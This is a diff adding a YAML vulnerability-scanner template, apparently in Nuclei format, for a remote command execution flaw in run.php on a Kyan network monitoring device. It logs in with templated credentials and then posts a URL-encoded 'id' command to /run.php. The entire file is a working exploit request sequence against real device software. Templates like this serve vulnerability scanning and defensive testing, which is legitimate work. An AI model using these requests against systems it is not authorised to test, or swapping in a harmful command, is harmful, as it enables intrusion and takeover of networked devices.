@@ -1,0 +1,46 @@
+id: yaml-poc-kyan-platform-other-CT-517528
+info:
+  name: Yaml Poc Kyan Platform Other Ct 517528
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-kyan-platform-other-CT-517528'
+  tags: xpoc
+  reference:
+  - https://github.com/Threekiii/Awesome-POC/blob/master/网络设备漏洞/Kyan%20网络监控设备%20run.php%20远程命令执行漏洞.md
+http:
+- method: GET
+  path:
+  - /hosts
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /login.php
+  body: 'user={{username}}&passwd={{password}}&x=56&y=21
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID={{r2}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /run.php
+  body: 'command=%09++++++id%0D%0A&textarea=++++++++++
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID={{r2}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
